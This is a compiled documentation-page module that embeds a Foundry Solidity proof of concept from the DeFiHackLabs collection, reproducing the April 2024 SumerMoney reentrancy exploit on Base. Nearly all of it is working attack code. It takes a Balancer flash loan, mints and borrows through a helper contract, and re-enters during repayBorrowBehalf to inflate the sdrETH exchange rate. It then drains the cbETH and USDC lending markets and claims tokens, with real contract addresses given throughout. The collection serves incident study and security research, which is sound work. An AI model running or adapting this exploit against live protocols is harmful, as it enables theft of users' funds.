import{_ as o,K as c,L as u,M as n,N as t,a5 as s,W as l,F as a}from"./framework-edebdfe1.js";const i={},k=n("h1",{id:"sumermoney",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#sumermoney","aria-hidden":"true"},"#"),t(" SumerMoney")],-1),r={href:"https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SumerMoney_exp.sol",target:"_blank",rel:"noopener noreferrer"},d=l(`<div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.15</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;forge-std/Test.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;./../interface.sol&quot;</span><span class="token punctuation">;</span>

<span class="token comment">// @KeyInfo - Total Lost : 350K</span>
<span class="token comment">// Attacker : /address/https://basescan.org/address/0xbb344544ad328b5492397e967fe81737855e7e77</span>
<span class="token comment">// Attack Contract : /address/https://basescan.org/address/0x13d27a2d66ea33a4bc581d5fefb0b2a8defe9fe7</span>
<span class="token comment">// Vulnerable Contract : /address/https://basescan.org/address/0x23811c17bac40500decd5fb92d4feb972ae1e607</span>
<span class="token comment">// Attack Tx : /tx/https://basescan.org/tx/0x619c44af9fedb8f5feea2dcae1da94b6d7e5e0e7f4f4a99352b6c4f5e43a4661</span>

<span class="token comment">// @Info</span>
<span class="token comment">// Vulnerable Contract Code : /address/https://basescan.org/address/0x23811c17bac40500decd5fb92d4feb972ae1e607#code</span>

<span class="token comment">// @Analysis</span>
<span class="token comment">// Post-mortem :</span>
<span class="token comment">// Twitter Guy : https://twitter.com/0xNickLFranklin/status/1778986926705672698</span>
<span class="token comment">// Hacking God :</span>

<span class="token keyword">interface</span> <span class="token class-name">IClaimer</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">calldata</span> tokenIds<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">SumerMoney</span> <span class="token keyword">is</span> Test <span class="token punctuation">{</span>
    <span class="token builtin">uint256</span> blocknumToForkFrom <span class="token operator">=</span> <span class="token number">13</span>_076_768<span class="token punctuation">;</span>

    IBalancerVault Balancer <span class="token operator">=</span> <span class="token function">IBalancerVault</span><span class="token punctuation">(</span><span class="token number">0xBA12222222228d8Ba445958a75a0704d566BF2C8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IWETH WETH <span class="token operator">=</span> <span class="token function">IWETH</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0x4200000000000000000000000000000000000006</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 USDC <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 cbETH <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    crETH sdrETH <span class="token operator">=</span> <span class="token function">crETH</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0x7b5969bB51fa3B002579D7ee41A454AC691716DC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ICErc20Delegate sdrUSDC <span class="token operator">=</span> <span class="token function">ICErc20Delegate</span><span class="token punctuation">(</span><span class="token number">0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ICErc20Delegate sdrcbETH <span class="token operator">=</span> <span class="token function">ICErc20Delegate</span><span class="token punctuation">(</span><span class="token number">0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IClaimer claimer <span class="token operator">=</span> <span class="token function">IClaimer</span><span class="token punctuation">(</span><span class="token number">0x549D0CdC753601fbE29f9DE186868429a8558E07</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Helper helper<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">setUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        vm<span class="token punctuation">.</span><span class="token function">label</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>Balancer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;Balancer&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">label</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>WETH<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;WETH&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">label</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>USDC<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;USDC&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">label</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>cbETH<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;cbETH&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">label</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>sdrETH<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;sdrETH&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">label</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>sdrUSDC<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;sdrUSDC&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">label</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>sdrcbETH<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;sdrcbETH&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">label</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>claimer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;claimer&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">createSelectFork</span><span class="token punctuation">(</span><span class="token string">&quot;Base&quot;</span><span class="token punctuation">,</span> blocknumToForkFrom<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">testExploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token function">deal</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> tokens <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tokens<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>WETH<span class="token punctuation">)</span><span class="token punctuation">;</span>
        tokens<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>USDC<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> amounts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        amounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">150</span> ether<span class="token punctuation">;</span>
        amounts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">645</span>_000 <span class="token operator">*</span> <span class="token number">1e6</span><span class="token punctuation">;</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> userData <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
        Balancer<span class="token punctuation">.</span><span class="token function">flashLoan</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> amounts<span class="token punctuation">,</span> userData<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">emit</span> <span class="token function">log_named_decimal_uint</span><span class="token punctuation">(</span><span class="token string">&quot;Attacker USDC Balance After exploit&quot;</span><span class="token punctuation">,</span> USDC<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">emit</span> <span class="token function">log_named_decimal_uint</span><span class="token punctuation">(</span><span class="token string">&quot;Attacker cbETH Balance After exploit&quot;</span><span class="token punctuation">,</span> cbETH<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">receiveFlashLoan</span><span class="token punctuation">(</span>
        <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> tokens<span class="token punctuation">,</span>
        <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> amounts<span class="token punctuation">,</span>
        <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> feeAmounts<span class="token punctuation">,</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> userData
    <span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        WETH<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>amounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// sdrETH.exchangeRate</span>
        <span class="token keyword">emit</span> <span class="token function">log_named_decimal_uint</span><span class="token punctuation">(</span><span class="token string">&quot;Before re-enter, sdrETH exchangeRate&quot;</span><span class="token punctuation">,</span> sdrETH<span class="token punctuation">.</span><span class="token function">exchangeRateCurrent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        sdrETH<span class="token punctuation">.</span>mint<span class="token punctuation">{</span>value<span class="token punctuation">:</span> amounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        helper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        USDC<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>helper<span class="token punctuation">)</span><span class="token punctuation">,</span> amounts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        helper<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span>amounts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        WETH<span class="token punctuation">.</span>deposit<span class="token punctuation">{</span>value<span class="token punctuation">:</span> amounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        WETH<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>Balancer<span class="token punctuation">)</span><span class="token punctuation">,</span> amounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        USDC<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>Balancer<span class="token punctuation">)</span><span class="token punctuation">,</span> amounts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        <span class="token comment">// exchangeRate == getCashPrior() + totalBorrows - totalReserves / totalSupply</span>
        <span class="token comment">// In function repayBorrowBehalf(), getCashPrior() increase 150 ether but totalBorrows not decreased due to re-enter</span>
        <span class="token keyword">emit</span> <span class="token function">log_named_decimal_uint</span><span class="token punctuation">(</span><span class="token string">&quot;In re-enter, sdrETH exchangeRate&quot;</span><span class="token punctuation">,</span> sdrETH<span class="token punctuation">.</span><span class="token function">exchangeRateCurrent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        sdrcbETH<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span>cbETH<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>sdrcbETH<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sdrUSDC<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span>USDC<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>sdrUSDC<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">645</span>_000 <span class="token operator">*</span> <span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sdrETH<span class="token punctuation">.</span><span class="token function">redeemUnderlying</span><span class="token punctuation">(</span><span class="token number">150</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> tokenIds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tokenIds<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">309</span><span class="token punctuation">;</span>
        tokenIds<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">310</span><span class="token punctuation">;</span>
        claimer<span class="token punctuation">.</span><span class="token function">claim</span><span class="token punctuation">(</span>tokenIds<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Helper</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>
    IWETH WETH <span class="token operator">=</span> <span class="token function">IWETH</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0x4200000000000000000000000000000000000006</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 USDC <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 cbETH <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    crETH sdrETH <span class="token operator">=</span> <span class="token function">crETH</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0x7b5969bB51fa3B002579D7ee41A454AC691716DC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ICErc20Delegate sdrUSDC <span class="token operator">=</span> <span class="token function">ICErc20Delegate</span><span class="token punctuation">(</span><span class="token number">0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ICErc20Delegate sdrcbETH <span class="token operator">=</span> <span class="token function">ICErc20Delegate</span><span class="token punctuation">(</span><span class="token number">0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IClaimer claimer <span class="token operator">=</span> <span class="token function">IClaimer</span><span class="token punctuation">(</span><span class="token number">0x549D0CdC753601fbE29f9DE186868429a8558E07</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">borrow</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        USDC<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>sdrUSDC<span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        sdrUSDC<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">uint256</span> borrowAmount <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>sdrETH<span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
        sdrETH<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span>borrowAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>

        sdrETH<span class="token punctuation">.</span>repayBorrowBehalf<span class="token punctuation">{</span>value<span class="token punctuation">:</span> borrowAmount <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// reentrancy</span>

        sdrUSDC<span class="token punctuation">.</span><span class="token function">redeem</span><span class="token punctuation">(</span>sdrUSDC<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> tokenIds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tokenIds<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">311</span><span class="token punctuation">;</span>
        claimer<span class="token punctuation">.</span><span class="token function">claim</span><span class="token punctuation">(</span>tokenIds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        USDC<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> USDC<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            owner<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">&quot;attack()&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function m(b,v){const p=a("ExternalLinkIcon"),e=a("DocsAD");return c(),u("div",null,[k,n("p",null,[n("a",r,[t("https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SumerMoney_exp.sol"),s(p)])]),s(e),d])}const y=o(i,[["render",m],["__file","sumermoney.html.vue"]]);export{y as default};
